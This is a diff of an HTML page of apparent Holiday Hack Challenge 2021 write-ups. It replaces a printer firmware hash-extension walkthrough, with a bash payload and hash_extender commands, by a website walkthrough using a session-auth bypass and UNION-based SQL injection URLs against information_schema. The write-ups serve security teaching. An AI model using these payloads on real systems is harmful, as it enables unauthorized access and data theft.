@@ -13,7 +13,7 @@
     
     
       
-        <title>Printer Exploitation - Ashish Gupta</title>
+        <title>Frost Tower Website Checkup - Ashish Gupta</title>
       
     
     
@@ -60,7 +60,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#examination-of-firmware" class="md-skip">
+        <a href="#high-level-plan" class="md-skip">
           Skip to content
         </a>
       
@@ -93,7 +93,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Printer Exploitation
+              Frost Tower Website Checkup
             
           </span>
         </div>
@@ -312,62 +312,11 @@
 
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Printer Exploitation
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Printer%20Exploitation/" class="md-nav__link">
         Printer Exploitation
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#examination-of-firmware" class="md-nav__link">
-    Examination of firmware
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#building-our-own-payload" class="md-nav__link">
-    Building our own payload
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#extend-the-original-firmware-payload-with-our-custom-payload" class="md-nav__link">
-    Extend the original firmware payload with our custom payload
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -438,11 +387,69 @@
 
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../Frost%20Tower%20Website%20Checkup/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Frost Tower Website Checkup
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Frost Tower Website Checkup
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#high-level-plan" class="md-nav__link">
+    High level plan
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#get-access-to-dashboard-exploit-broken-auth" class="md-nav__link">
+    Get access to dashboard : exploit broken auth
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#get-additional-table-exploit-sql-injection" class="md-nav__link">
+    Get additional table : exploit SQL Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extract-data-from-additional-table" class="md-nav__link">
+    Extract data from additional table
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -472,22 +479,29 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#examination-of-firmware" class="md-nav__link">
-    Examination of firmware
+  <a href="#high-level-plan" class="md-nav__link">
+    High level plan
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#building-our-own-payload" class="md-nav__link">
-    Building our own payload
+  <a href="#get-access-to-dashboard-exploit-broken-auth" class="md-nav__link">
+    Get access to dashboard : exploit broken auth
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#extend-the-original-firmware-payload-with-our-custom-payload" class="md-nav__link">
-    Extend the original firmware payload with our custom payload
+  <a href="#get-additional-table-exploit-sql-injection" class="md-nav__link">
+    Get additional table : exploit SQL Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extract-data-from-additional-table" class="md-nav__link">
+    Extract data from additional table
   </a>
   
 </li>
@@ -505,159 +519,193 @@
               
                 
 
-  <h1>Printer Exploitation</h1>
+  <h1>Frost Tower Website Checkup</h1>
 
 <table border=1px>
 <tr>
-    <td colspan=3>
-    <b>Challenge : </b> <br>
-    Investigate the stolen Kringle Castle printer. Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? <br> 
-    Find Ruby Cyster in Jack's office for help with this objective. 
-    </td>
-</tr>
-<tr>
     <td>
     <b>Difficulty Level : </b> <br>
-    <img src="../../images/hhc2021/difficulty_4.png" alt="drawing" width="100px"/><br>
-    </td>
-    <td>
-     <b>Location : </b> <br>
-        Jack’s Office                                                                                     
-    </td>
-    <td>
-    <b>Elf/Troll : </b> <br>
-   <img src="../../images/hhc2021/image027.png" alt="drawing" width="30px"/> Ruby Cyster <br>
+    <img src="../../images/hhc2021/difficulty_5.png" alt="drawing" width="100px"/><br>
     </td>
 </tr>
+<tr>
+    <td>
+    <b>Challenge : </b> <br>
+   Investigate Frost Tower's website for security issues. <br>
+   This source code will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? <br>
+   Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
+    </td>
+</tr>
+
 </table>
 
+<h4 id="high-level-plan">High level plan</h4>
+<p>Below is the high level plan after examining the code. <br></p>
+<ol>
+    <li> Broken auth: Exploit the /postcontact endpoint to log in and get access to the dashboard. </li>
+    <li> SQL Injection: Exploit the /detail endpoint to get additional table name (“todo”) and its column names. </li>
+    <li> Get data from table “todo” table having the job position for Santa.</li>
+</ol>
+
+<h4 id="get-access-to-dashboard-exploit-broken-auth">Get access to dashboard : exploit broken auth</h4>
+<p>The base URL of the website is <a href="https://staging.jackfrosttower.com/" target=_blank>https://staging.jackfrosttower.com/</a>
+Looking at the source code (server.js), we figure out different endpoint’s pages. <br>
+For example:</br>
+a)  <a href="https://staging.jackfrosttower.com/dashboard" target=_blank>Dashboard</a> </br>
+a)  <a href="https://staging.jackfrosttower.com/login" target=_blank>Login</a> </br></p>
+<p>Look at server.js (around line 670) <br>
+The /dashboard endpoint needs a uniquid which is apparently created only after authentication.<br>
+<img src="../../images/hhc2021/image136.png" alt="drawing" width="600px"/><br></p>
+<p>The /postcontact endpoint checks if the contact already exists, saves the email requested in the session.uniqueid.<br>
+So, we will first create a contact with a specific email address and then use the same email address to attempt to create another contact. <br> That won’t succeed but the email will be stored in the session.uniqueid. 
+[server.js, around line 151]
+<img src="../../images/hhc2021/image137.png" alt="drawing" width="800px"/><br></p>
+<p>As we see below, entering another contact with email Stephan.Strange@gmail.com fails. <br> 
+However, because the Session.UniquiID is set to the email address due to the bug, we have a session.<br>
+Now, we can access the dashboard https://staging.jackfrosttower.com/dashboard.<br></p>
 <table>
 <tr>
-    <td>
-    <img src="../../images/hhc2021/image069.png" alt="drawing" width="200px"/>
-    </td>
-    <td>
-    <b> Hints from Ruby Cyster (Because we solved the objective “Shellcode primer”) : </b> <br>
-    <ol>
-    <li>You should definitely look at the firmware
-    <li>Pick the firmware apart and see what's there.
-    <li>If you append multiple files of that type, the last one is processed.
-    <li>Look at hash Extension Attacks.
-    <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank"> Link 1</a> |
-    <a href="https://github.com/iagox86/hash_extender"  target="_blank">Link 2 </a>
-    <li>Files placed in /app/lib/public/incoming will be accessible under
-    <a href="https://printer.kringlecastle.com/incoming/"  target="_blank">https://printer.kringlecastle.com/incoming/</a> </li>
-    </ol>
-
-    <b> Website :</b> <br>
-    <a href="https://printer.kringlecastle.com/"  target="_blank">https://printer.kringlecastle.com/</a>
-    </td>
+    <th>
+    Adding contact with email "Stephan.Strange@marvel.com". <br>
+    Contact successfully added.
+    </th>
+    <th>
+    Tried adding another contact with same email "Stephan.Strange@marvel.com".<br>
+    Fails with "Email Already exists" error.
+    </th>
+</tr>
+<tr>
+    <td><img src="../../images/hhc2021/image138_1.png" alt="drawing" width="800px"/><br></td>
+    <td><img src="../../images/hhc2021/image138_2.png" alt="drawing" width="800px"/><br></td>
 <tr>
 </table>
-
-<h3 id="examination-of-firmware">Examination of firmware</h3>
-<p>Following the grinch's first hint, we go to https://printer.kringlecon.com &gt; Firmware update &gt; Download current firmware and download it. It’s basically a JSON file. <br>
-The element <b>firmware</b> has the firmware data in it. 
-<img src="../../images/hhc2021/image070.png" alt="drawing" width="800px"/></p>
-<p>Decode it and save the output to a file named firmware_hhc2021</p>
-<p><img src="../../images/hhc2021/image071.png" alt="drawing" width="800px"/></p>
-<p>We determine the file type and we see It’s a zip file so we rename the file to firmware_hhc2021.zip</p>
-<p><img src="../../images/hhc2021/image072.png" alt="drawing" width="800px"/></p>
-<h3 id="building-our-own-payload">Building our own payload</h3>
-<p>We build a bin file with above and name it firmware_ashish.bin. <br>
-This will copy the last entry of the xlsx file from /var/spool/printer.log and save in a new file named /app/lib/public/incoming/ashish.<br></p>
-<pre><code class="language-bash">#!/bin/bash
-grep xlsx /var/spool/printer.log | tail -n1 &gt; /app/lib/public/incoming/ashish
-</code></pre>
-<p>Provide execute permission on the firmware_ashish.bin
-<img src="../../images/hhc2021/image073.png" alt="drawing" width="800px"/></p>
-<p>Zip firmware_ashish.bin to firmware_ashish.zip.
-<img src="../../images/hhc2021/image074.png" alt="drawing" width="800px"/></p>
-<h3 id="extend-the-original-firmware-payload-with-our-custom-payload">Extend the original firmware payload with our custom payload</h3>
-<p>We make use of <a href="https://github.com/iagox86/hash_extender" target="_blank">hash extender</a>. <br>
-Download the source and build it.</p>
-<pre><code class="language-bash">git clone https://github.com/iagox86/hash_extender
-cd hash_extender
-make
-</code></pre>
-<p><img src="../../images/hhc2021/image075.png" alt="drawing" width="800px"/></p>
-<p>Now we havd the original firmware firmware_hhc2021.zip and custom firmware_ashish.zip.
-<img src="../../images/hhc2021/image076.png" alt="drawing" width="600px"/></p>
-<p>Now will need to append our payload firmware_ashish.zip to the original firmware_hhc2021.zip. <br></p>
-<p>Following the readme on <a href="https://github.com/iagox86/hash_extender" target="_blank">https://github.com/iagox86/hash_extender</a>. <br> Below would be our inputs to the hash_extender.</p>
+<p><br></p>
+<h4 id="get-additional-table-exploit-sql-injection">Get additional table : exploit SQL Injection</h4>
+<p>Now that we have access to Dashboard, we navigate there.
+In this dashboard, we see the "Detail" and the "Edit" functions. <br>
+<img src="../../images/hhc2021/image138_3.png" alt="drawing" width="1200px"/></p>
+<p>Looking at the details of one contact. <br>
+<a href="https://staging.jackfrosttower.com/detail/68" target=_blank>https://staging.jackfrosttower.com/detail/68</a> </br>
+<img src="../../images/hhc2021/image140.png" alt="drawing" width="400px"/></p>
+<p>Now looking at the server.js for the corresponding code for /detail/:id <br>
+We see It takes a CSV of contact Ids, split them with comma(,) and then form a WHERE clause.<br>
+e.g. If we send <br>
+https://staging.jackfrosttower.com/detail/67,68 <br>
+It will result the below query to be executed: <br>
+SELECT * FROM uniquecontact WHERE id=67 OR id=68 <br>
+Resulting in showing 2 records on the web page.<br></p>
 <table>
 <tr>
-    <th>Hash Extender Switch</th>
-    <th>Spplied values and explaination</th>
+    <th>
+    The code
+    </th>
+    <th>
+    Input and Output result
+    </th>
 </tr>
 <tr>
-    <td>--file</td>
-    <td><b>firmware_hhc2021.zip</b> <br>
-    The original payload from printer portal in zipped format
-    </td>
-</tr>
+    <td><img src="../../images/hhc2021/image141.png" alt="drawing" width="800px"/><br></td>
+    <td><img src="../../images/hhc2021/image142_1.png" alt="drawing" width="800px"/><br></td>
 <tr>
-    <td>--append</td>
-    <td>
-    <b>$(cat firmware.zip | xxd -p -c 99999)</b><br>
-    HEX representation of our payload in the zip file (firmware_ashish.zip) 
-    </td>
-</tr>
-<tr>
-    <td>--append-format</td>
-    <td>
-    <b>hex</b> <br>
-    (because we are appending a HEX value)
-    </td>
-</tr>
-<tr>
-    <td>--secret</td>
-    <td>
-    <b>16</b> <br>
-    (Present in the original JSON file we downloaded from the printer portal)
-    </td>
-</tr>
-<tr>
-    <td>--format</td>
-    <td>
-    <b>sha256</b> <br>
-    (Present in the original JSON file we downloaded from the printer portal)
-    </td>
-</tr>
-<tr>
-    <td>--signature</td>
-    <td>
-    <b>2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97</b> <br>
-    (Present in the original JSON file we downloaded from the printer portal)
-    </td>
-</tr>
-<tr>
-    <td>--out-data-format</td>
-    <td>
-    <b>hex</b> <br>
-    </td>
-</tr>
+</table>
+<p><br></p>
+<p>But if we add a OR 1=1, it will show all contacts. <br>
+<a href="https://stackoverflow.com/a/27289735/255562" target=_blank>Tautology based SQL Injection</a> <br>
+<a href="https://staging.jackfrosttower.com/detail/67,68%20OR%201=1" target=_blank>https://staging.jackfrosttower.com/detail/67,68%20OR%201=1</a> <br></p>
+<td><img src="../../images/hhc2021/image143.png" alt="drawing" width="800px"/><br></td>
+
+<p>Going back to the original question <br></p>
+<blockquote>
+<p>In Jack Frost's TODO list, what job position does Jack plan to offer Santa?  <br></p>
+</blockquote>
+<p>The zip file containing source code also contains the database schema in the encontact_db.sql <br>
+None of the tables in the encontact_db.sql suggest they could store todo items where we need to look for. <br> 
+This means there are additional tables which the source code does not provide us.<br></p>
+<p>So, we query the system database views to find the additional tables. <br></p>
+<p>So we query the database to find the additional tables.</p>
+<pre><code>https://staging.jackfrosttower.com/detail/1,30 
+UNION SELECT * FROM (SELECT 9999)a 
+JOIN (SELECT 8888)b 
+JOIN (SELECT TABLE_NAME from information_schema.TABLES as email )c 
+JOIN (SELECT 7777)d 
+JOIN (SELECT 6666)e 
+JOIN (SELECT 5555)f 
+JOIN (SELECT 4444)g --
+</code></pre>
+<p>In the above query, we are combining the uniquecontact with hard coded values along with the table names from INFORMATION_SCHEMA.TABLES. <br>
+Its UNION which requires the number of columns and their names match between the tables getting union'ed.</p>
+<table>
+    <tr>
+        <th>Columns in the "uniquecontact" table</th>
+        <th>Hardcoded</th>
+    </tr>
+    <tr>
+        <td>id</td>
+        <td>9999</td>
+    </tr>
+    <tr>
+        <td>full_name</td>
+        <td>8888</td>
+    </tr>
+    <tr>
+        <td>email</td>
+        <td>SELECT TABLE_NAME from information_schema.TABLES</td>
+    </tr>
+    <tr>
+        <td>phone</td>
+        <td>7777</td>
+    </tr>
+    <tr>
+        <td>contry</td>
+        <td>6666</td>
+    </tr>
+    <tr>
+        <td>date_created</td>
+        <td>5555</td>
+    </tr>
+    <tr>
+        <td>date_update</td>
+        <td>4444</td>
+    </tr>
 </table>
 
-<p>We fire up hash_extender with the above switch values : <br></p>
-<pre><code class="language-bash">./hash_extender --file=firmware_hhc2021.zip --secret=16 
---signature =&quot;2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97&quot; 
---append=$(cat firmware_ashish.zip | xxd -p -c 99999) --format sha256 --out-data-format=hex
+<p>When we use the above URL with SQL injection payload, It shows the table name from information_schema.TABLES in the email field as we setup above. <br></p>
+<pre><code class="language-sql">https://staging.jackfrosttower.com/detail/67,68 UNION SELECT * FROM (SELECT 9999)a 
+JOIN (SELECT 8888)b 
+JOIN (SELECT TABLE_NAME from information_schema.TABLES as email )c 
+JOIN (SELECT 7777)d
+JOIN (SELECT 6666)e 
+JOIN (SELECT 5555)f 
+JOIN (SELECT 4444)g --
 </code></pre>
-<p>This produced a new string and new signature. </p>
-<p><img src="../../images/hhc2021/image077.png" alt="drawing" width="1000px"/></p>
-<p>The new string produced is in hex format (as we specified in the --out-data-format). <br>
-So, we need to use Cyberchef to convert the hex to base64.</p>
-<p><img src="../../images/hhc2021/image078.png" alt="drawing" width="1000px"/></p>
-<p>This output from CyberChef has our appended paylod to get the file name. <br>
-Now we update the original firmware_export.json with the new payload and the new signature we got above.
-<img src="../../images/hhc2021/image079.png" alt="drawing" width="1200px"/></p>
-<p>Now we upload the new firmware-export.json back to the portal. <br>
-We browse the file https://printer.kringlecastle.com/incoming/ashish<br>
-File "ashish" is downloaded and we can see the xlsx file name in it. <br></p>
-<p><img src="../../images/hhc2021/image080.png" alt="drawing" width="1200px"/></p>
-<p>We submit “Troll_Pay_Chart.xlsx” as the answer to this objective and it is accepted.</p>
-<p><img src="../../images/hhc2021/image081.png" alt="drawing" width="400px"/></p>
+<p><img src="../../images/hhc2021/image144.png" alt="drawing" width="400px"/></p>
+<p>Now we have additional "todo" table which may have our answer for "what job position does Jack plan to offer Santa". <br>
+Now let's find the columns in the "todo" table using the same methodology but using the INFORMATION_SCHEMA.COLUMNS. <br>
+The only difference here being, we concatenate all the column names as CSV using the <a href="https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target=_blank>group_concat()</a> function.<br></p>
+<pre><code>https://staging.jackfrosttower.com/detail/37,68 UNION ALL SELECT * FROM (SELECT 9999)a 
+JOIN (SELECT 8888)b 
+JOIN (SELECT group_concat(COLUMN_NAME) from information_schema.COLUMNS as email)c 
+JOIN (SELECT 7777)d 
+JOIN (SELECT 6666)e 
+JOIN (SELECT 5555)f 
+JOIN (SELECT 4444)g --
+</code></pre>
+<p>Now we see the columns in all the three tables. <br></p>
+<p><img src="../../images/hhc2021/image145.png" alt="drawing" width="1200px"/></p>
+<h4 id="extract-data-from-additional-table">Extract data from additional table</h4>
+<p>We now focus on the newly found "todo" table. <br>
+The most relevant column here is <b>note</b>. So, we get values from <b>note</b> column from "todo" table. <br></p>
+<pre><code>https://staging.jackfrosttower.com/detail/1,30 UNION ALL SELECT * FROM (SELECT 9999)a 
+JOIN (SELECT 8888)b 
+JOIN (SELECT note from todo as email)c 
+JOIN (SELECT 7777)d 
+JOIN (SELECT 6666)e 
+JOIN (SELECT 5555)f 
+JOIN (SELECT 4444)g --
+</code></pre>
+<p>Now we see all the notes from “todo” table and one of them noting Jack Frost planned to offer <b>clerk</b> position to Santa. <br> 
+We enter "clerk" as the answer and it is accepted!! <br></p>
+<p><img src="../../images/hhc2021/image147.png" alt="drawing" width="400px"/></p>
 
               
             </article>
@@ -671,7 +719,7 @@ File "ashish" is downloaded and we can see the xlsx file name in it. <br></p>
     <nav class="md-footer__inner md-grid" aria-label="Footer">
       
         
-        <a href="../Shell%20Code%20Primer/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Shell Code Primer" rel="prev">
+        <a href="../Customer%20Complaint%20Analysis/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Customer Complaint Analysis" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
           </div>
@@ -680,26 +728,11 @@ File "ashish" is downloaded and we can see the xlsx file name in it. <br></p>
               <span class="md-footer__direction">
                 Previous
               </span>
-              Shell Code Primer
+              Customer Complaint Analysis
             </div>
           </div>
         </a>
       
-      
-        
-        <a href="../Kerberoasting%20on%20an%20Open%20Fire/" class="md-footer__link md-footer__link--next" aria-label="Next: Kerberoasting on an Open Fire" rel="next">
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              Kerberoasting on an Open Fire
-            </div>
-          </div>
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-          </div>
-        </a>
       
     </nav>
   
